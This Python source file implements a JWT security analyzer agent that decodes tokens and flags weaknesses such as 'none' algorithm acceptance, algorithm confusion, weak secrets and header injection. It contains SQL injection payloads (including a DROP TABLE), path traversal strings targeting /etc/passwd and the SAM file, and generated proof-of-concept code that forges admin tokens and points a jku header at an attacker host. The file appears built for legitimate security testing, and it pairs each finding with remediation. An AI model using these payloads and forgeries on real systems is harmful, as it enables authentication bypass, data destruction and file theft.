"""
JWT Analyzer Agent

Comprehensive JWT (JSON Web Token) security testing agent that identifies
vulnerabilities in JWT implementations including:
- Algorithm confusion attacks (alg: none, HS256→RS256)
- Weak secret detection via brute force and wordlist attacks
- Header injection (jwk, jku, kid)
- Expired token acceptance
- Signature verification bypass
- Key confusion attacks
- SQL injection via kid parameter
- Missing signature validation
- Token tampering detection

This agent parses, decodes, and attacks JWT tokens to find authentication
and authorization vulnerabilities.
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import base64
import json
import hashlib
import hmac
import time
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta
import re



@dataclass
class JWTVulnerability:
    """Represents a JWT vulnerability finding."""
    vuln_type: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    title: str
    description: str
    evidence: Dict[str, Any]
    poc: str
    remediation: str
    cwe: Optional[str] = None
    cvss_score: Optional[float] = None


@dataclass
class JWTAnalysisResult:
    """Result from JWT analysis."""
    token: str
    is_valid: bool
    header: Dict[str, Any] = field(default_factory=dict)
    payload: Dict[str, Any] = field(default_factory=dict)
    signature: str = ""
    vulnerabilities: List[JWTVulnerability] = field(default_factory=list)
    warnings: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert analysis result to dictionary."""
        return {
            'token': self.token,
            'is_valid': self.is_valid,
            'header': self.header,
            'payload': self.payload,
            'signature': self.signature,
            'vulnerabilities': [asdict(v) for v in self.vulnerabilities],
            'warnings': self.warnings,
            'metadata': self.metadata
        }


class JWTAnalyzer:
    """
    JWT Security Analyzer

    Performs comprehensive security analysis of JWT tokens including:
    - Decoding and validation
    - Algorithm confusion attacks
    - Weak secret detection
    - Header injection testing
    - Expiration validation
    - Signature bypass attempts
    """

    # Common weak secrets for brute force
    COMMON_SECRETS = [
        'secret',
        'password',
        'secret123',
        'jwt_secret',
        'api_key',
        'your-256-bit-secret',
        'your-secret-key',
        'mysecret',
        'test',
        'dev',
        'debug',
        '1234',
        '12345',
        '123456',
        'admin',
        'root',
        ''  # Empty string
    ]

    # SQL injection payloads for kid parameter
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "'; DROP TABLE keys--",
        "' OR 'a'='a",
        "admin'--",
        "' OR ''='",
        "1' ORDER BY 1--",
        "1' UNION SELECT NULL, NULL--",
        "' AND 1=0 UNION ALL SELECT 'admin', 'password"
    ]

    def __init__(self):
        """Initialize JWT analyzer."""
        self.analyzed_tokens: List[JWTAnalysisResult] = []

    def analyze_token(self, token: str, original_secret: Optional[str] = None) -> JWTAnalysisResult:
        """
        Perform comprehensive analysis of a JWT token.

        Args:
            token: JWT token string
            original_secret: Optional original secret for comparison

        Returns:
            JWTAnalysisResult with all findings
        """
        result = JWTAnalysisResult(token=token, is_valid=False)

        try:
            # Decode token parts
            parts = token.split('.')
            if len(parts) != 3:
                result.warnings.append(f"Invalid JWT format: expected 3 parts, got {len(parts)}")
                return result

            # Decode header and payload
            try:
                result.header = self._decode_base64url(parts[0])
                result.payload = self._decode_base64url(parts[1])
                result.signature = parts[2]
                result.is_valid = True
            except Exception as e:
                result.warnings.append(f"Failed to decode token: {str(e)}")
                return result

            # Store metadata
            result.metadata = {
                'algorithm': result.header.get('alg', 'unknown'),
                'type': result.header.get('typ', 'unknown'),
                'issued_at': result.payload.get('iat'),
                'expires_at': result.payload.get('exp'),
                'not_before': result.payload.get('nbf'),
                'subject': result.payload.get('sub'),
                'issuer': result.payload.get('iss')
            }

            # Run security tests
            result.vulnerabilities.extend(self._test_algorithm_confusion(result))
            result.vulnerabilities.extend(self._test_none_algorithm(result))
            result.vulnerabilities.extend(self._test_weak_secret(result, original_secret))
            result.vulnerabilities.extend(self._test_header_injection(result))
            result.vulnerabilities.extend(self._test_expiration(result))
            result.vulnerabilities.extend(self._test_kid_injection(result))
            result.vulnerabilities.extend(self._test_signature_validation(result))
            result.vulnerabilities.extend(self._test_key_confusion(result))

            # Add warnings for security concerns
            self._add_security_warnings(result)

            self.analyzed_tokens.append(result)

        except Exception as e:
            result.warnings.append(f"Analysis error: {str(e)}")

        return result

    def _decode_base64url(self, data: str) -> Dict[str, Any]:
        """
        Decode base64url encoded data.

        Args:
            data: Base64url encoded string

        Returns:
            Decoded JSON object as dictionary
        """
        # Add padding if needed
        padding = 4 - (len(data) % 4)
        if padding != 4:
            data += '=' * padding

        # Replace URL-safe characters
        data = data.replace('-', '+').replace('_', '/')

        # Decode and parse JSON
        decoded = base64.b64decode(data)
        return json.loads(decoded)

    def _encode_base64url(self, data: Dict[str, Any]) -> str:
        """
        Encode data as base64url.

        Args:
            data: Dictionary to encode

        Returns:
            Base64url encoded string
        """
        json_str = json.dumps(data, separators=(',', ':'))
        encoded = base64.b64encode(json_str.encode()).decode()
        # Make URL-safe and remove padding
        return encoded.replace('+', '-').replace('/', '_').rstrip('=')

    def _test_algorithm_confusion(self, result: JWTAnalysisResult) -> List[JWTVulnerability]:
        """
        Test for algorithm confusion attacks (HS256 → RS256).

        If server uses RS256 but doesn't verify algorithm, attacker can
        switch to HS256 and sign with public key as secret.
        """
        vulns = []

        algorithm = result.header.get('alg', '').upper()

        if algorithm == 'RS256':
            # Generate HS256 variant
            modified_header = result.header.copy()
            modified_header['alg'] = 'HS256'

            vuln = JWTVulnerability(
                vuln_type='ALGORITHM_CONFUSION',
                severity='HIGH',
                title='Potential Algorithm Confusion Attack (RS256→HS256)',
                description=(
                    'Token uses RS256 algorithm. If the server does not strictly verify '
                    'the algorithm and uses the public key for HMAC verification, an attacker '
                    'can switch to HS256 and sign with the public key as the secret.'
                ),
                evidence={
                    'current_algorithm': 'RS256',
                    'attack_algorithm': 'HS256',
                    'modified_header': modified_header
                },
                poc=self._generate_alg_confusion_poc(result),
                remediation=(
                    'Explicitly verify the algorithm in the JWT header matches expected algorithm. '
                    'Never allow algorithm to be specified by the token itself. '
                    'Use allowlist of accepted algorithms.'
                ),
                cwe='CWE-327',
                cvss_score=7.5
            )
            vulns.append(vuln)

        elif algorithm == 'HS256':
            # Check for potential upgrade to RS256
            result.warnings.append(
                'Token uses HS256. Ensure server does not accept RS256 variant.'
            )

        return vulns

    def _test_none_algorithm(self, result: JWTAnalysisResult) -> List[JWTVulnerability]:
        """
        Test for 'none' algorithm vulnerability.

        Some JWT libraries accept algorithm 'none' which bypasses signature
        verification entirely.
        """
        vulns = []

        algorithm = result.header.get('alg', '').lower()

        # Always test for 'none' algorithm acceptance
        modified_header = result.header.copy()
        modified_header['alg'] = 'none'

        # Create unsigned token (empty signature)
        header_b64 = self._encode_base64url(modified_header)
        payload_b64 = self._encode_base64url(result.payload)
        unsigned_token = f"{header_b64}.{payload_b64}."

        vuln = JWTVulnerability(
            vuln_type='NONE_ALGORITHM',
            severity='CRITICAL',
            title="Token May Accept 'none' Algorithm (Signature Bypass)",
            description=(
                "JWT tokens that accept algorithm 'none' completely bypass signature "
                "verification. This allows an attacker to forge arbitrary tokens without "
                "knowing the signing key."
            ),
            evidence={
                'unsigned_token': unsigned_token,
                'modified_header': modified_header,
                'current_algorithm': algorithm
            },
            poc=self._generate_none_algorithm_poc(result, unsigned_token),
            remediation=(
                "Explicitly reject tokens with algorithm 'none'. "
                "Configure JWT library to only accept expected algorithms. "
                "Use strict algorithm validation."
            ),
            cwe='CWE-347',
            cvss_score=9.1
        )
        vulns.append(vuln)

        # Check if already using 'none'
        if algorithm == 'none':
            crit_vuln = JWTVulnerability(
                vuln_type='NONE_ALGORITHM_ACTIVE',
                severity='CRITICAL',
                title="Token Uses 'none' Algorithm - No Signature!",
                description=(
                    "This token is using algorithm 'none' which means it has NO signature. "
                    "Anyone can create or modify these tokens without authentication."
                ),
                evidence={
                    'algorithm': 'none',
                    'signature': result.signature,
                    'header': result.header
                },
                poc='Token is already unsigned. Modify payload and submit.',
                remediation=(
                    "NEVER use algorithm 'none' in production. "
                    "Use HS256, RS256, or ES256 with proper key management."
                ),
                cwe='CWE-347',
                cvss_score=10.0
            )
            vulns.append(crit_vuln)

        return vulns

    def _test_weak_secret(self, result: JWTAnalysisResult,
                          original_secret: Optional[str] = None) -> List[JWTVulnerability]:
        """
        Test for weak HMAC secrets via brute force.

        Attempts to crack HS256/HS384/HS512 signatures using common secrets.
        """
        vulns = []

        algorithm = result.header.get('alg', '').upper()

        # Only test HMAC algorithms
        if algorithm not in ['HS256', 'HS384', 'HS512']:
            return vulns

        # Extract signing input
        parts = result.token.split('.')
        signing_input = f"{parts[0]}.{parts[1]}"
        signature = parts[2]

        # Try to crack with common secrets
        cracked_secret = None
        for secret in self.COMMON_SECRETS:
            test_signature = self._generate_signature(signing_input, secret, algorithm)
            if test_signature == signature:
                cracked_secret = secret
                break

        if cracked_secret is not None:
            vuln = JWTVulnerability(
                vuln_type='WEAK_SECRET',
                severity='CRITICAL',
                title=f'Weak JWT Secret Detected: "{cracked_secret}"',
                description=(
                    f'The JWT signing secret was cracked using a common wordlist. '
                    f'The secret is: "{cracked_secret}". This allows an attacker to '
                    f'forge arbitrary tokens and completely bypass authentication.'
                ),
                evidence={
                    'cracked_secret': cracked_secret,
                    'algorithm': algorithm,
                    'original_token': result.token,
                    'is_empty_secret': len(cracked_secret) == 0
                },
                poc=self._generate_weak_secret_poc(result, cracked_secret),
                remediation=(
                    'Use a cryptographically strong random secret (minimum 256 bits for HS256). '
                    'Never use common words, default values, or empty strings. '
                    'Rotate secrets regularly. Consider using RS256 with public/private keypair.'
                ),
                cwe='CWE-798',
                cvss_score=9.8
            )
            vulns.append(vuln)

        # Warn if original secret was provided and is weak
        if original_secret and len(original_secret) < 32:
            vuln = JWTVulnerability(
                vuln_type='WEAK_SECRET_LENGTH',
                severity='HIGH',
                title='JWT Secret Too Short',
                description=(
                    f'The JWT secret is only {len(original_secret)} characters. '
                    f'For HS256, minimum recommended length is 32 bytes (256 bits).'
                ),
                evidence={
                    'secret_length': len(original_secret),
                    'recommended_length': 32,
                    'algorithm': algorithm
                },
                poc='N/A - Secret length issue',
                remediation='Use minimum 32-byte random secret for HS256.',
                cwe='CWE-326',
                cvss_score=7.0
            )
            vulns.append(vuln)

        return vulns

    def _test_header_injection(self, result: JWTAnalysisResult) -> List[JWTVulnerability]:
        """
        Test for JWK/JKU header injection vulnerabilities.

        jwk: Embedded public key
        jku: URL to fetch keys from
        """
        vulns = []

        header = result.header

        # Check for jwk header
        if 'jwk' in header:
            vuln = JWTVulnerability(
                vuln_type='JWK_INJECTION',
                severity='HIGH',
                title='JWT Contains Embedded Public Key (jwk)',
                description=(
                    'Token contains an embedded public key in the jwk header. '
                    'If the server trusts this embedded key without validation, '
                    'an attacker can inject their own public key and sign tokens.'
                ),
                evidence={
                    'jwk': header['jwk'],
                    'header': header
                },
                poc=self._generate_jwk_injection_poc(result),
                remediation=(
                    'Do not trust embedded jwk headers. '
                    'Always verify keys against a trusted keystore. '
                    'Reject tokens with jwk headers unless explicitly required and validated.'
                ),
                cwe='CWE-347',
                cvss_score=8.1
            )
            vulns.append(vuln)

        # Check for jku header
        if 'jku' in header:
            jku_url = header['jku']
            vuln = JWTVulnerability(
                vuln_type='JKU_INJECTION',
                severity='HIGH',
                title='JWT Contains Key URL (jku) - SSRF Risk',
                description=(
                    f'Token contains a jku (JWK Set URL) header pointing to: {jku_url}. '
                    'If the server fetches keys from untrusted URLs, an attacker can '
                    'host malicious keys and sign arbitrary tokens. This also creates SSRF risk.'
                ),
                evidence={
                    'jku': jku_url,
                    'header': header
                },
                poc=self._generate_jku_injection_poc(result, jku_url),
                remediation=(
                    'Do not fetch keys from URLs specified in tokens. '
                    'Use a static, hardcoded list of trusted key URLs. '
                    'Implement strict URL validation and allowlisting. '
                    'Consider this an SSRF vector.'
                ),
                cwe='CWE-918',
                cvss_score=8.5
            )
            vulns.append(vuln)

        # Check for x5u header (X.509 URL)
        if 'x5u' in header:
            x5u_url = header['x5u']
            vuln = JWTVulnerability(
                vuln_type='X5U_INJECTION',
                severity='HIGH',
                title='JWT Contains X.509 URL (x5u) - SSRF Risk',
                description=(
                    f'Token contains an x5u header pointing to: {x5u_url}. '
                    'Similar to jku, this can be exploited for SSRF and key injection.'
                ),
                evidence={
                    'x5u': x5u_url,
                    'header': header
                },
                poc=f'Host malicious certificate at attacker-controlled URL',
                remediation='Reject x5u headers or use strict URL allowlisting.',
                cwe='CWE-918',
                cvss_score=8.5
            )
            vulns.append(vuln)

        return vulns

    def _test_expiration(self, result: JWTAnalysisResult) -> List[JWTVulnerability]:
        """
        Test for expiration validation issues.

        Checks if token is expired and tests if server validates expiration.
        """
        vulns = []

        payload = result.payload
        current_time = int(time.time())

        # Check exp claim
        if 'exp' in payload:
            exp = payload['exp']
            if current_time > exp:
                expired_seconds = current_time - exp
                vuln = JWTVulnerability(
                    vuln_type='EXPIRED_TOKEN',
                    severity='MEDIUM',
                    title=f'Token is Expired (by {expired_seconds}s)',
                    description=(
                        f'This token expired {expired_seconds} seconds ago. '
                        'If the server accepts this token, it indicates missing or '
                        'improper expiration validation.'
                    ),
                    evidence={
                        'exp': exp,
                        'current_time': current_time,
                        'expired_seconds': expired_seconds,
                        'expired_at': datetime.fromtimestamp(exp).isoformat()
                    },
                    poc=self._generate_expiration_poc(result),
                    remediation=(
                        'Always validate the exp claim. '
                        'Reject tokens where current_time >= exp. '
                        'Use reasonable token lifetimes (15min-1hr for access tokens).'
                    ),
                    cwe='CWE-613',
                    cvss_score=5.3
                )
                vulns.append(vuln)
        else:
            # Missing exp claim
            vuln = JWTVulnerability(
                vuln_type='MISSING_EXPIRATION',
                severity='MEDIUM',
                title='Token Missing Expiration Claim (exp)',
                description=(
                    'Token does not have an expiration claim. '
                    'This token could be valid forever, creating session fixation risk.'
                ),
                evidence={
                    'payload': payload,
                    'missing_claims': ['exp']
                },
                poc='Token has no expiration - test if server enforces max lifetime',
                remediation=(
                    'Always include exp claim in JWT tokens. '
                    'Enforce maximum token lifetime on server (e.g., 1 hour). '
                    'Consider adding iat (issued at) claim as well.'
                ),
                cwe='CWE-613',
                cvss_score=5.0
            )
            vulns.append(vuln)

        # Check nbf (not before)
        if 'nbf' in payload:
            nbf = payload['nbf']
            if current_time < nbf:
                vuln = JWTVulnerability(
                    vuln_type='PREMATURE_TOKEN',
                    severity='LOW',
                    title='Token Not Yet Valid (nbf)',
                    description=f'Token is not valid until {datetime.fromtimestamp(nbf).isoformat()}',
                    evidence={'nbf': nbf, 'current_time': current_time},
                    poc='Wait until nbf timestamp',
                    remediation='Validate nbf claim if used',
                    cwe='CWE-613',
                    cvss_score=3.0
                )
                vulns.append(vuln)

        return vulns

    def _test_kid_injection(self, result: JWTAnalysisResult) -> List[JWTVulnerability]:
        """
        Test for SQL injection in kid (Key ID) parameter.

        The kid parameter is often used in database lookups without sanitization.
        """
        vulns = []

        header = result.header

        if 'kid' not in header:
            return vulns

        kid = header['kid']

        # Check if kid looks like it might be injectable
        suspicious_chars = ["'", '"', '--', ';', '/*', '*/', 'UNION', 'SELECT']
        is_suspicious = any(char in str(kid).upper() for char in suspicious_chars)

        if is_suspicious:
            vuln = JWTVulnerability(
                vuln_type='KID_INJECTION_ACTIVE',
                severity='CRITICAL',
                title='Possible Active SQL Injection in kid Parameter',
                description=(
                    f'The kid parameter contains suspicious SQL characters: {kid}. '
                    'This suggests an active injection or malformed kid value.'
                ),
                evidence={
                    'kid': kid,
                    'suspicious': True
                },
                poc='Kid parameter already contains injection attempt',
                remediation='Sanitize and validate kid parameter. Use parameterized queries.',
                cwe='CWE-89',
                cvss_score=9.8
            )
            vulns.append(vuln)

        # Always test for SQL injection potential
        test_payloads = self.SQL_INJECTION_PAYLOADS[:3]  # Test a few payloads

        vuln = JWTVulnerability(
            vuln_type='KID_SQLI_POTENTIAL',
            severity='HIGH',
            title='Kid Parameter May Be Vulnerable to SQL Injection',
            description=(
                'The kid (Key ID) parameter is often used to lookup signing keys in a database. '
                'If this parameter is not properly sanitized, it may be vulnerable to SQL injection. '
                f'Current kid value: {kid}'
            ),
            evidence={
                'kid': kid,
                'test_payloads': test_payloads,
                'injection_vectors': self._generate_kid_injection_poc(result, test_payloads)
            },
            poc=self._generate_kid_injection_poc(result, test_payloads),
            remediation=(
                'Use parameterized queries for kid lookups. '
                'Validate kid against allowlist of valid key IDs. '
                'Treat kid as untrusted user input.'
            ),
            cwe='CWE-89',
            cvss_score=8.6
        )
        vulns.append(vuln)

        # Test path traversal in kid
        if '/' in str(kid) or '\\' in str(kid) or '..' in str(kid):
            vuln = JWTVulnerability(
                vuln_type='KID_PATH_TRAVERSAL',
                severity='HIGH',
                title='Kid Parameter Contains Path Traversal Characters',
                description=(
                    f'Kid parameter contains path traversal sequences: {kid}. '
                    'If keys are loaded from filesystem, this could lead to arbitrary file read.'
                ),
                evidence={'kid': kid},
                poc=self._generate_kid_path_traversal_poc(result),
                remediation='Validate kid against strict allowlist. Do not use kid for file paths.',
                cwe='CWE-22',
                cvss_score=7.5
            )
            vulns.append(vuln)

        return vulns

    def _test_signature_validation(self, result: JWTAnalysisResult) -> List[JWTVulnerability]:
        """
        Test if signature validation is properly enforced.

        Creates modified tokens to test if server validates signatures.
        """
        vulns = []

        # Create token with modified payload but same signature
        modified_payload = result.payload.copy()

        # Try to elevate privileges
        if 'role' in modified_payload:
            modified_payload['role'] = 'admin'
        elif 'admin' in modified_payload:
            modified_payload['admin'] = True
        elif 'user' in modified_payload:
            modified_payload['user'] = 'admin'
        else:
            modified_payload['admin'] = True

        modified_token = self._create_modified_token(result.header, modified_payload, result.signature)

        vuln = JWTVulnerability(
            vuln_type='SIGNATURE_NOT_VERIFIED',
            severity='CRITICAL',
            title='Server May Not Validate JWT Signatures',
            description=(
                'Test if the server properly validates JWT signatures by submitting '
                'a token with modified payload but original signature. If accepted, '
                'the server is not validating signatures at all.'
            ),
            evidence={
                'original_token': result.token,
                'modified_token': modified_token,
                'modified_payload': modified_payload,
                'original_payload': result.payload
            },
            poc=self._generate_signature_bypass_poc(result, modified_token),
            remediation=(
                'ALWAYS validate JWT signatures before trusting token contents. '
                'Use a well-tested JWT library. '
                'Verify signature matches the header algorithm and payload.'
            ),
            cwe='CWE-347',
            cvss_score=9.8
        )
        vulns.append(vuln)

        return vulns

    def _test_key_confusion(self, result: JWTAnalysisResult) -> List[JWTVulnerability]:
        """
        Test for key confusion between different services.

        If multiple services share the same secret or accept each other's tokens,
        an attacker can abuse tokens from one service to access another.
        """
        vulns = []

        payload = result.payload

        # Check for audience claim
        if 'aud' not in payload:
            vuln = JWTVulnerability(
                vuln_type='MISSING_AUDIENCE',
                severity='MEDIUM',
                title='Token Missing Audience Claim (aud)',
                description=(
                    'Token does not specify an audience. Without aud claim validation, '
                    'tokens from one service might be accepted by another service, '
                    'leading to privilege escalation or unauthorized access.'
                ),
                evidence={
                    'payload': payload,
                    'missing_claims': ['aud']
                },
                poc='Create token without aud claim and test on different services',
                remediation=(
                    'Include aud claim in all tokens. '
                    'Validate aud claim matches expected service identifier. '
                    'Reject tokens with missing or incorrect audience.'
                ),
                cwe='CWE-287',
                cvss_score=6.5
            )
            vulns.append(vuln)

        # Check for issuer claim
        if 'iss' not in payload:
            vuln = JWTVulnerability(
                vuln_type='MISSING_ISSUER',
                severity='LOW',
                title='Token Missing Issuer Claim (iss)',
                description=(
                    'Token does not specify an issuer. Without iss validation, '
                    'it is harder to verify token authenticity and prevent token confusion attacks.'
                ),
                evidence={
                    'payload': payload,
                    'missing_claims': ['iss']
                },
                poc='Test token across multiple services',
                remediation='Include and validate iss claim',
                cwe='CWE-287',
                cvss_score=4.0
            )
            vulns.append(vuln)

        return vulns

    def _add_security_warnings(self, result: JWTAnalysisResult):
        """Add general security warnings based on token analysis."""

        payload = result.payload

        # Check for sensitive data in payload
        sensitive_keys = ['password', 'secret', 'key', 'ssn', 'credit_card', 'api_key']
        for key in payload.keys():
            if any(sensitive in key.lower() for sensitive in sensitive_keys):
                result.warnings.append(
                    f'Payload contains potentially sensitive key: {key}. '
                    'JWT payloads are base64-encoded, not encrypted.'
                )

        # Check for long token lifetime
        if 'exp' in payload and 'iat' in payload:
            lifetime = payload['exp'] - payload['iat']
            if lifetime > 3600:  # 1 hour
                hours = lifetime / 3600
                result.warnings.append(
                    f'Token lifetime is {hours:.1f} hours. '
                    'Consider shorter lifetimes for access tokens.'
                )

    def _generate_signature(self, signing_input: str, secret: str, algorithm: str) -> str:
        """Generate HMAC signature for JWT."""
        if algorithm == 'HS256':
            hash_func = hashlib.sha256
        elif algorithm == 'HS384':
            hash_func = hashlib.sha384
        elif algorithm == 'HS512':
            hash_func = hashlib.sha512
        else:
            return ''

        signature = hmac.new(
            secret.encode(),
            signing_input.encode(),
            hash_func
        ).digest()

        # Base64url encode
        return base64.b64encode(signature).decode().replace('+', '-').replace('/', '_').rstrip('=')

    def _create_modified_token(self, header: Dict, payload: Dict, signature: str) -> str:
        """Create a modified JWT token."""
        header_b64 = self._encode_base64url(header)
        payload_b64 = self._encode_base64url(payload)
        return f"{header_b64}.{payload_b64}.{signature}"

    # POC Generation Methods

    def _generate_alg_confusion_poc(self, result: JWTAnalysisResult) -> str:
        """Generate POC for algorithm confusion attack."""
        return f"""
# Algorithm Confusion Attack POC
# Step 1: Extract public key from server (RS256)
# Step 2: Modify header to use HS256
# Step 3: Sign token using public key as HMAC secret

import jwt

public_key = '''
-----BEGIN PUBLIC KEY-----
[Server's RSA Public Key]
-----END PUBLIC KEY-----
'''

modified_header = {{'alg': 'HS256', 'typ': 'JWT'}}
payload = {result.payload}

# Sign with public key as secret (HS256)
malicious_token = jwt.encode(payload, public_key, algorithm='HS256', headers=modified_header)

# Test: curl -H "Authorization: Bearer $malicious_token" https://target.com/api/user
"""

    def _generate_none_algorithm_poc(self, result: JWTAnalysisResult, unsigned_token: str) -> str:
        """Generate POC for 'none' algorithm attack."""
        return f"""
# 'none' Algorithm Attack POC

# Original token: {result.token}

# Modified header with alg: none
header = {{"alg": "none", "typ": "JWT"}}

# Modified payload (e.g., privilege escalation)
payload = {result.payload}
payload['admin'] = True  # Escalate privileges

# Create unsigned token
unsigned_token = "{unsigned_token}"

# Test: curl -H "Authorization: Bearer $unsigned_token" https://target.com/api/admin
"""

    def _generate_weak_secret_poc(self, result: JWTAnalysisResult, secret: str) -> str:
        """Generate POC for weak secret exploitation."""
        return f"""
# Weak Secret Exploitation POC
# Cracked secret: "{secret}"

import jwt

secret = '{secret}'
payload = {result.payload}

# Modify payload (e.g., change user ID, add admin role)
payload['user_id'] = 'attacker'
payload['admin'] = True

# Create forged token
forged_token = jwt.encode(payload, secret, algorithm='{result.header.get('alg', 'HS256')}')

print(f"Forged token: {{forged_token}}")

# Test: curl -H "Authorization: Bearer $forged_token" https://target.com/api/admin
"""

    def _generate_jwk_injection_poc(self, result: JWTAnalysisResult) -> str:
        """Generate POC for JWK injection."""
        return """
# JWK Injection POC
# Step 1: Generate attacker's RSA keypair
# Step 2: Embed public key in jwk header
# Step 3: Sign with attacker's private key

from jwcrypto import jwk, jwt
import json

# Generate attacker's key
key = jwk.JWK.generate(kty='RSA', size=2048)
public_key = json.loads(key.export_public())

# Create malicious header with embedded public key
header = {
    'alg': 'RS256',
    'typ': 'JWT',
    'jwk': public_key
}

# Create malicious payload
payload = {'user': 'admin', 'admin': True}

# Sign with attacker's private key
# Server will use embedded public key from jwk header
"""

    def _generate_jku_injection_poc(self, result: JWTAnalysisResult, jku_url: str) -> str:
        """Generate POC for JKU injection."""
        return f"""
# JKU Injection POC

# Step 1: Host malicious JWK Set at attacker-controlled URL
# https://attacker.com/jwks.json:
{{
  "keys": [
    {{
      "kty": "RSA",
      "kid": "attacker-key",
      "use": "sig",
      "n": "[attacker's public key modulus]",
      "e": "AQAB"
    }}
  ]
}}

# Step 2: Create token with jku header pointing to attacker's server
header = {{
    'alg': 'RS256',
    'typ': 'JWT',
    'jku': 'https://attacker.com/jwks.json',
    'kid': 'attacker-key'
}}

# Step 3: Sign with attacker's private key
# Server will fetch keys from jku URL and accept attacker's signature

# Original jku: {jku_url}
"""

    def _generate_expiration_poc(self, result: JWTAnalysisResult) -> str:
        """Generate POC for expiration bypass."""
        exp = result.payload.get('exp', 'N/A')
        return f"""
# Expiration Bypass Test

# This token expired at: {datetime.fromtimestamp(exp).isoformat() if isinstance(exp, (int, float)) else exp}

# Test 1: Submit expired token
curl -H "Authorization: Bearer {result.token}" https://target.com/api/user

# Test 2: Create token with very long expiration
import jwt
import time

payload = {result.payload}
payload['exp'] = int(time.time()) + 31536000  # 1 year from now

# If you know the secret, create long-lived token
"""

    def _generate_kid_injection_poc(self, result: JWTAnalysisResult, payloads: List[str]) -> str:
        """Generate POC for kid SQL injection."""
        current_kid = result.header.get('kid', 'unknown')

        poc = f"""
# Kid SQL Injection POC
# Current kid: {current_kid}

# Test payloads to replace kid value:
"""
        for payload in payloads:
            modified_header = result.header.copy()
            modified_header['kid'] = payload
            poc += f"\nPayload: {payload}\n"
            poc += f"Modified header: {modified_header}\n"

        poc += """
# If database query is vulnerable:
# SELECT key FROM keys WHERE kid = '$kid'
# Becomes:
# SELECT key FROM keys WHERE kid = '' OR '1'='1'

# This could leak all keys or bypass authentication
"""
        return poc

    def _generate_kid_path_traversal_poc(self, result: JWTAnalysisResult) -> str:
        """Generate POC for kid path traversal."""
        return """
# Kid Path Traversal POC

# If server loads keys from filesystem using kid parameter:
# key_path = f"/keys/{kid}.pem"

# Test payloads:
test_kids = [
    '../../etc/passwd',
    '../../../secret.key',
    '....//....//....//etc/passwd',
    '/etc/passwd',
    'C:/Windows/System32/config/SAM'
]

# Create tokens with path traversal in kid
# May lead to arbitrary file read or key confusion
"""

    def _generate_signature_bypass_poc(self, result: JWTAnalysisResult, modified_token: str) -> str:
        """Generate POC for signature validation bypass."""
        return f"""
# Signature Validation Bypass Test

# Original token: {result.token}

# Modified token (payload changed, signature unchanged):
# {modified_token}

# If server accepts this token, it is NOT validating signatures!

# Test:
curl -H "Authorization: Bearer {modified_token}" https://target.com/api/user

# Expected: 401 Unauthorized (signature invalid)
# If you get 200: CRITICAL vulnerability - no signature validation!
"""

    def get_summary(self) -> Dict[str, Any]:
        """
        Get summary of all analyzed tokens.

        Returns:
            Summary statistics and vulnerability counts
        """
        total_vulns = sum(len(r.vulnerabilities) for r in self.analyzed_tokens)

        vuln_by_severity = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        vuln_by_type = {}

        for result in self.analyzed_tokens:
            for vuln in result.vulnerabilities:
                vuln_by_severity[vuln.severity] = vuln_by_severity.get(vuln.severity, 0) + 1
                vuln_by_type[vuln.vuln_type] = vuln_by_type.get(vuln.vuln_type, 0) + 1

        return {
            'tokens_analyzed': len(self.analyzed_tokens),
            'total_vulnerabilities': total_vulns,
            'vulnerabilities_by_severity': vuln_by_severity,
            'vulnerabilities_by_type': vuln_by_type,
            'tokens': [r.to_dict() for r in self.analyzed_tokens]
        }
